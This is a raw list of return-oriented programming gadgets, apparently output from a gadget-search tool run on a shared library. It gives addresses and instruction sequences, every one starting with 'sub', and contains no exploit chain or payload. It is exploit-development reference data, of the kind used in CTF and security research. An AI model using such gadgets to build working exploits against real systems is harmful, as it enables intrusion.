0x00002aaaaac14d24 : sub byte ptr [rax], r8b ; call qword ptr [rax]
0x00002aaaaac18853 : sub byte ptr [rax], r8b ; test eax, eax ; jne 0x143869 ; xor eax, eax ; ret
0x00002aaaaac18883 : sub byte ptr [rax], r8b ; test eax, eax ; jne 0x143899 ; xor eax, eax ; ret
0x00002aaaaac188b3 : sub byte ptr [rax], r8b ; test eax, eax ; jne 0x1438c9 ; xor eax, eax ; ret
0x00002aaaaab8004a : sub byte ptr [rbp + 0x63], dh ; ret
0x00002aaaaab80049 : sub byte ptr [rbp + 0x63], r14b ; ret
0x00002aaaaabb7a52 : sub byte ptr [rbp + rcx*4 - 0x7c], cl ; and al, 0x20 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaac8adfa : sub byte ptr [rbx + 0x300e4e05], al ; add cl, byte ptr [rsi + rcx + 0x28] ; ret
0x00002aaaaaaf783e : sub byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf56bf : sub byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab19c97 : sub byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab1cf44 : sub byte ptr [rbx + rcx*4 + 0x4e], cl ; xor byte ptr [rax - 0x75], cl ; jbe 0x47fc8 ; xor eax, eax ; ret
0x00002aaaaab1cbb4 : sub byte ptr [rbx + rcx*4 + 0x4f], cl ; xor byte ptr [rax - 0x75], cl ; jg 0x47c30 ; xor eax, eax ; ret
0x00002aaaaab63ba7 : sub byte ptr [rbx + rcx*4 + 0x6e], cl ; xor byte ptr [rbx + rcx*4 + 0x76], cl ; cmp byte ptr [rax + 0xf], cl ; ret
0x00002aaaaac17903 : sub byte ptr [rbx - 0x26], dh ; mov eax, 1 ; ret
0x00002aaaaac17902 : sub byte ptr [rbx - 0x26], sil ; mov eax, 1 ; ret
0x00002aaaaac85158 : sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac692b0 : sub byte ptr [rbx], 0xfb ; jmp qword ptr [rax]
0x00002aaaaab80047 : sub byte ptr [rbx], bh ; sub byte ptr [rbp + 0x63], r14b ; ret
0x00002aaaaab56089 : sub byte ptr [rcx + rcx*4 + 0x54], cl ; and al, 0x20 ; call rax
0x00002aaaaac10627 : sub byte ptr [rcx + rcx*4 + 0x63], cl ; and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabc3f31 : sub byte ptr [rcx + rcx*4 - 0x18], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab55d0a : sub byte ptr [rcx + rcx*4 - 1], cl ; mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaab08500 : sub byte ptr [rcx - 0x17c7dbbc], cl ; xchg eax, esi ; ret
0x00002aaaaac0880f : sub byte ptr [rcx - 0x39], cl ; xor byte ptr [r8], r8b ; add byte ptr [rax], al ; add al, ch ; ret
0x00002aaaaab0a2e6 : sub byte ptr [rcx - 0x3b76b310], cl ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaaaff27a : sub byte ptr [rcx - 0x77], al ; ret 0x8b4c
0x00002aaaaabb82e9 : sub byte ptr [rcx - 0x7d], al ; cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xf44
0x00002aaaaab24ff0 : sub byte ptr [rcx], ah ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac17931 : sub byte ptr [rcx], al ; add byte ptr [rax], al ; jmp rax
0x00002aaaaac102d2 : sub byte ptr [rcx], bh ; sal dword ptr [rbx + 9], 1 ; xor eax, eax ; ret
0x00002aaaaab59530 : sub byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaac02bfc : sub byte ptr [rdi - 0x17], dh ; mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaac83dd8 : sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab831d2 : sub byte ptr [rdi], cl ; xchg eax, esp ; ret 0xf883
0x00002aaaaab2166f : sub byte ptr [rdx], al ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab4b90a : sub byte ptr [rdx], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac806fa : sub byte ptr [rsi + 0x300e4105], al ; add dword ptr [rsi], 2 ; ret
0x00002aaaaac7d25a : sub byte ptr [rsi + 0x300e4405], al ; add dword ptr [rsi], 0x77 ; ret
0x00002aaaaac7896a : sub byte ptr [rsi + 0x300e4405], al ; add dword ptr [rsi], 2 ; xchg eax, ebp ; ret
0x00002aaaaac8a4d3 : sub byte ptr [rsi + 0x300e4805], al ; add dword ptr [rsi], 2 ; ret
0x00002aaaaac5de70 : sub byte ptr [rsi], al ; cmc ; call qword ptr [rcx]
0x00002aaaaaad7c0c : sub byte ptr [rsi], cl ; and byte ptr [rsi - 0x32], dh ; clc ; ret
0x00002aaaaac84119 : sub ch, dh ; jmp qword ptr [rbx]
0x00002aaaaab09b32 : sub cl, al ; add rsp, 0x28 ; ret
0x00002aaaaab09ace : sub cl, al ; jne 0x34ae8 ; add rsp, 0x28 ; ret
0x00002aaaaab09e09 : sub cl, al ; jne 0x34e20 ; add rsp, 0x28 ; ret
0x00002aaaaab09931 : sub cl, al ; ret
0x00002aaaaabcd331 : sub cl, bh ; dec dword ptr [rbp + rcx*4 + 0x24] ; sub byte ptr [rax - 0x77], cl ; ret 0x8d49
0x00002aaaaabd6f7c : sub cl, bl ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaaba5c0d : sub cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaab8069e : sub cl, byte ptr [rbx + 0x47890846] ; or al, 0x48 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab6d9b5 : sub cl, byte ptr [rdi] ; mov dh, 0x55 ; ret
0x00002aaaaab3b2c8 : sub cl, byte ptr [rdi] ; test byte ptr [rdx], cl ; or al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab4f8a5 : sub cl, ch ; ret 0xfffe
0x00002aaaaabe2b5c : sub dh, al ; add byte ptr [rax], ah ; jmp 0x10db2a
0x00002aaaaab20cd0 : sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaabd903d : sub dh, al ; add byte ptr [rdx], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac5be45 : sub dh, al ; jmp rax
0x00002aaaaab80e34 : sub dh, bh ; dec dword ptr [rax - 0x73] ; cld ; pop rbx ; ret
0x00002aaaaab0a302 : sub dh, byte ptr [rcx + rdi] ; add byte ptr [rbp - 0xcf98a40], al ; ret
0x00002aaaaabc7c1a : sub dh, byte ptr [rdx + 9] ; add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaac7f609 : sub dh, dl ; jmp qword ptr [rdi]
0x00002aaaaab4706b : sub dil, dil ; loopne 0x7200a ; mov eax, 0xffffffff ; ret
0x00002aaaaac5f4bd : sub dl, bh ; call rax
0x00002aaaaac6f551 : sub dl, bh ; dec esp ; add al, byte ptr ss:[rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaac5f4b9 : sub dl, bh ; jmp rax
0x00002aaaaac5f4b5 : sub dl, bh ; push qword ptr [rax - 0x1f0005d8] ; sub dl, bh ; call rax
0x00002aaaaac26c74 : sub dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabd58bd : sub dword ptr [rax + rax], ebp ; ret
0x00002aaaaac06821 : sub dword ptr [rax - 0x48000000], 1 ; ret
0x00002aaaaac0c677 : sub dword ptr [rax], eax ; add al, byte ptr [rax] ; add byte ptr [rax], al ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaab39324 : sub dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], al ; in al, dx ; add dword ptr [rax + 1], ecx ; ret
0x00002aaaaac009cd : sub dword ptr [rax], eax ; add rsp, 8 ; ret
0x00002aaaaac0c6ee : sub dword ptr [rax], eax ; cmp rax, rdx ; je 0x13770b ; add rsp, 8 ; ret
0x00002aaaaac0b582 : sub dword ptr [rax], eax ; jne 0x136598 ; jmp 0x1365b2
0x00002aaaaabfcb85 : sub dword ptr [rax], eax ; mov eax, dword ptr [rax + 0x18] ; test eax, eax ; jne 0x127b99 ; ret
0x00002aaaaac0c62c : sub dword ptr [rax], eax ; mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaac021c5 : sub dword ptr [rax], eax ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaabfce05 : sub dword ptr [rax], eax ; mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaabffcd6 : sub dword ptr [rax], eax ; pop rbx ; ret
0x00002aaaaac009b4 : sub dword ptr [rax], eax ; test eax, eax ; je 0x12b9c6 ; ret
0x00002aaaaab9dc33 : sub dword ptr [rbx - 0x76b7ffd1], edi ; ret 0x8d48
0x00002aaaaac3cf03 : sub dword ptr [rbx], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac6cb7d : sub dword ptr [rcx], eax ; add byte ptr [rbx + rax*2 - 0xe], dh ; call rsp
0x00002aaaaac17a7e : sub dword ptr [rcx], esi ; ror byte ptr [rax - 0x7d], 0xc4 ; ret
0x00002aaaaac259f7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x150a0d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25b47 : sub dword ptr [rdi + 0x10], ebx ; jb 0x150b5d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25c97 : sub dword ptr [rdi + 0x10], ebx ; jb 0x150cad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25de7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x150dfd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25f37 : sub dword ptr [rdi + 0x10], ebx ; jb 0x150f4d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26087 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15109d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac261d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1511ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26327 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15133d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26477 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15148d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac265c7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1515dd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26717 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15172d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26867 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15187d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac269b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1519cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26b07 : sub dword ptr [rdi + 0x10], ebx ; jb 0x151b1d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26c57 : sub dword ptr [rdi + 0x10], ebx ; jb 0x151c6d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac283c7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1533dd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28517 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15352d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28667 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15367d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac287b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1537cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28907 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15391d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28a57 : sub dword ptr [rdi + 0x10], ebx ; jb 0x153a6d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28ba7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x153bbd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28cf7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x153d0d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28e47 : sub dword ptr [rdi + 0x10], ebx ; jb 0x153e5d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28f97 : sub dword ptr [rdi + 0x10], ebx ; jb 0x153fad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac290e7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1540fd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29237 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15424d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29387 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15439d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac294d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1544ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29627 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15463d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2ad97 : sub dword ptr [rdi + 0x10], ebx ; jb 0x155dad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2aee7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x155efd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b037 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15604d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b187 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15619d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b2d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1562ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b427 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15643d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b577 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15658d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b6c7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x1566dd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b817 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15682d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b967 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15697d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bab7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x156acd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bc07 : sub dword ptr [rdi + 0x10], ebx ; jb 0x156c1d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bd57 : sub dword ptr [rdi + 0x10], ebx ; jb 0x156d6d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bea7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x156ebd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bff7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x15700d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25953 : sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2594f : sub dword ptr [rdi - 0x20], esp ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac590da : sub dword ptr [rdi], ecx ; push rbx ; xchg eax, edx ; jae 0x1840bd ; push rsi ; pop rdx ; je 0x1840b2 ; ret 0xacfc
0x00002aaaaab3b500 : sub dword ptr [rdi], ecx ; test ah, al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabc6204 : sub dword ptr [rdi], ecx ; test ah, dh ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x3101
0x00002aaaaac259fd : sub dword ptr [rdi], esp ; jmp r9
0x00002aaaaac56f53 : sub dword ptr [rdx + 0x2b], esi ; pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaabf42c5 : sub dword ptr [rdx], 0 ; call rax
0x00002aaaaac44a69 : sub dword ptr [rdx], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43bf6 : sub dword ptr [rip - 0xcfffffe], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret
0x00002aaaaac0c726 : sub eax, -0x80 ; add rsp, 8 ; ret
0x00002aaaaac0d32f : sub eax, 0 ; add byte ptr [rax], al ; test rax, rax ; jne 0x13832b ; pop rbx ; ret
0x00002aaaaab59509 : sub eax, 0x10 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac103aa : sub eax, 0x10c48348 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbbf15 : sub eax, 0x28b4800 ; mov qword ptr [rdx], rdi ; ret
0x00002aaaaac69a3d : sub eax, 0x2f00fffc ; cld ; call rax
0x00002aaaaac69a1d : sub eax, 0x2f30fffc ; cld ; call qword ptr [rax]
0x00002aaaaabbc8b5 : sub eax, 0x36740000 ; xor eax, eax ; ret
0x00002aaaaaaf53dd : sub eax, 0x415d003a ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaabff432 : sub eax, 0x441f0f ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabbeab5 : sub eax, 0x5a0a8900 ; pop rcx ; pop rbx ; ret
0x00002aaaaac26884 : sub eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabbeb95 : sub eax, 0x64d8f700 ; mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab09ba9 : sub eax, 0x7f800000 ; shr eax, 0x1f ; ret
0x00002aaaaab2b841 : sub eax, 0x83000000 ; ret
0x00002aaaaab6ce0d : sub eax, 0x854dffff ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac90abb : sub eax, 0x88d0000 ; rol byte ptr [rcx], cl ; ret 0xb
0x00002aaaaac07af4 : sub eax, 0x8948f631 ; out -0x77, eax ; ret
0x00002aaaaac59e9a : sub eax, 0x8acc8c6 ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaac0b89e : sub eax, 1 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaaba24e4 : sub eax, 1 ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaab6b96a : sub eax, 1 ; jne 0x96967 ; pop rbx ; pop rbp ; ret
0x00002aaaaaaff6e4 : sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x00002aaaaab1d46f : sub eax, 1 ; ret
0x00002aaaaabe9611 : sub eax, dword ptr [r8] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaabe9343 : sub eax, dword ptr [r8] ; test eax, eax ; jne 0x114359 ; xor eax, eax ; ret
0x00002aaaaabe9373 : sub eax, dword ptr [r8] ; test eax, eax ; jne 0x114389 ; xor eax, eax ; ret
0x00002aaaaabe93a3 : sub eax, dword ptr [r8] ; test eax, eax ; jne 0x1143b9 ; xor eax, eax ; ret
0x00002aaaaabe93d3 : sub eax, dword ptr [r8] ; test eax, eax ; jne 0x1143e9 ; xor eax, eax ; ret
0x00002aaaaabe9403 : sub eax, dword ptr [r8] ; test eax, eax ; jne 0x114419 ; xor eax, eax ; ret
0x00002aaaaac26a86 : sub eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabdda43 : sub eax, dword ptr [rax] ; add al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaabdda36 : sub eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaabe9612 : sub eax, dword ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaabdd724 : sub eax, dword ptr [rax] ; add eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaabddb28 : sub eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x00002aaaaabe97af : sub eax, dword ptr [rax] ; cmp rdx, rax ; jne 0x114798 ; ret
0x00002aaaaabdd9c2 : sub eax, dword ptr [rax] ; je 0x1089cd ; pop rbp ; ret
0x00002aaaaabe056a : sub eax, dword ptr [rax] ; jne 0x10b580 ; jmp 0x10b59a
0x00002aaaaabda666 : sub eax, dword ptr [rax] ; mov dword ptr fs:[rax], 2 ; xor eax, eax ; ret
0x00002aaaaabde755 : sub eax, dword ptr [rax] ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaabde02d : sub eax, dword ptr [rax] ; mov rax, qword ptr [rax + 0x18] ; add dword ptr [rax], 1 ; ret
0x00002aaaaabddddd : sub eax, dword ptr [rax] ; mov rax, qword ptr [rax + 0x18] ; add word ptr [rax], 1 ; ret
0x00002aaaaabda408 : sub eax, dword ptr [rax] ; neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaabe9efc : sub eax, dword ptr [rax] ; pop rbp ; ret
0x00002aaaaabdd974 : sub eax, dword ptr [rax] ; pop rbx ; ret
0x00002aaaaabe8ec4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113edb ; mov eax, 1 ; ret
0x00002aaaaabe8ef4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113f08 ; xor eax, eax ; ret
0x00002aaaaabe8f24 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113f38 ; xor eax, eax ; ret
0x00002aaaaabe8f54 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113f68 ; xor eax, eax ; ret
0x00002aaaaabe8f84 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113f98 ; xor eax, eax ; ret
0x00002aaaaabe8fb4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113fc8 ; xor eax, eax ; ret
0x00002aaaaabe8fe4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113ff8 ; xor eax, eax ; ret
0x00002aaaaabe9014 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114028 ; xor eax, eax ; ret
0x00002aaaaabe9044 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114058 ; xor eax, eax ; ret
0x00002aaaaabe9074 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114088 ; xor eax, eax ; ret
0x00002aaaaabe90a4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1140b8 ; xor eax, eax ; ret
0x00002aaaaabe90d4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1140e8 ; xor eax, eax ; ret
0x00002aaaaabe9104 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114118 ; xor eax, eax ; ret
0x00002aaaaabe9134 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114148 ; xor eax, eax ; ret
0x00002aaaaabe9164 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114178 ; xor eax, eax ; ret
0x00002aaaaabe9194 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1141a8 ; xor eax, eax ; ret
0x00002aaaaabe91c4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1141d8 ; xor eax, eax ; ret
0x00002aaaaabe91f4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114208 ; xor eax, eax ; ret
0x00002aaaaabe9224 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114238 ; xor eax, eax ; ret
0x00002aaaaabe9254 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114268 ; xor eax, eax ; ret
0x00002aaaaabe9284 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114298 ; xor eax, eax ; ret
0x00002aaaaabe92e4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1142f8 ; xor eax, eax ; ret
0x00002aaaaabe9314 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114328 ; xor eax, eax ; ret
0x00002aaaaabe9344 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114358 ; xor eax, eax ; ret
0x00002aaaaabe9374 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114388 ; xor eax, eax ; ret
0x00002aaaaabe93a4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1143b8 ; xor eax, eax ; ret
0x00002aaaaabe93d4 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1143e8 ; xor eax, eax ; ret
0x00002aaaaabe9404 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114418 ; xor eax, eax ; ret
0x00002aaaaabe9434 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114448 ; xor eax, eax ; ret
0x00002aaaaabe9433 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114449 ; xor eax, eax ; ret
0x00002aaaaabe9464 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114478 ; xor eax, eax ; ret
0x00002aaaaabe9463 : sub eax, dword ptr [rax] ; test eax, eax ; jne 0x114479 ; xor eax, eax ; ret
0x00002aaaaabe9985 : sub eax, dword ptr [rax] ; test rax, rax ; je 0x114997 ; ret
0x00002aaaaac02c85 : sub eax, dword ptr [rbx + 0x18] ; add rsp, 8 ; pop rbx ; pop rbp ; add eax, edx ; ret
0x00002aaaaab521b5 : sub eax, dword ptr [rbx + 0x18] ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab52149 : sub eax, dword ptr [rbx + 0x20] ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab0369f : sub eax, dword ptr [rbx + 8] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab20c80 : sub eax, dword ptr [rcx + 0xf] ; mov dh, 0x46 ; or al, 0x83 ; ret
0x00002aaaaab7f211 : sub eax, dword ptr [rcx + r8*4] ; je 0xaa1f7 ; ret
0x00002aaaaab7f212 : sub eax, dword ptr [rcx + rax*4] ; je 0xaa1f6 ; ret
0x00002aaaaac6fdd5 : sub eax, dword ptr [rcx] ; add ah, dh ; ret 0xfffd
0x00002aaaaab520be : sub eax, dword ptr [rdi + 0x18] ; ret
0x00002aaaaab4c4d5 : sub eax, dword ptr [rdi + 0x20] ; ret
0x00002aaaaab4c3c5 : sub eax, dword ptr [rdi + 0x38] ; ret
0x00002aaaaabed94c : sub eax, dword ptr [rdi + rcx - 0x42] ; ret 0x8d45
0x00002aaaaab484f5 : sub eax, dword ptr [rdx + 0x10] ; sar rax, 2 ; ret
0x00002aaaaab4c4c6 : sub eax, dword ptr [rdx + 0x18] ; sar rax, 2 ; ret
0x00002aaaaab4c3b6 : sub eax, dword ptr [rdx + 0x30] ; sar rax, 2 ; ret
0x00002aaaaab7f1ca : sub eax, dword ptr [rdx + rcx*4] ; je 0xaa1b6 ; ret
0x00002aaaaac6f3c5 : sub eax, dword ptr [rdx] ; add byte ptr [rbx + rdi*8 - 7], dl ; jmp rsp
0x00002aaaaab51863 : sub eax, dword ptr [rsi + 0x10] ; ret
0x00002aaaaabe500c : sub eax, eax ; cmp sil, dl ; cmovne eax, ecx ; ret
0x00002aaaaac1ea5e : sub eax, eax ; ret
0x00002aaaaab506dd : sub eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab815ab : sub eax, ebp ; pop rbp ; pop r12 ; ret
0x00002aaaaabadc22 : sub eax, ebx ; mov ecx, eax ; mov eax, 1 ; mov rdx, r8 ; jmp 0xd8c45
0x00002aaaaabe510a : sub eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab51019 : sub eax, ecx ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab1f13d : sub eax, ecx ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab5f57c : sub eax, ecx ; ret
0x00002aaaaab47d69 : sub eax, ecx ; sar r8, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab5fd09 : sub eax, edi ; ret
0x00002aaaaabe4f9f : sub eax, edx ; cmp dil, cl ; cmovne eax, esi ; ret
0x00002aaaaab0f639 : sub eax, edx ; ret
0x00002aaaaab09b8f : sub eax, edx ; shr eax, 0x1f ; ret
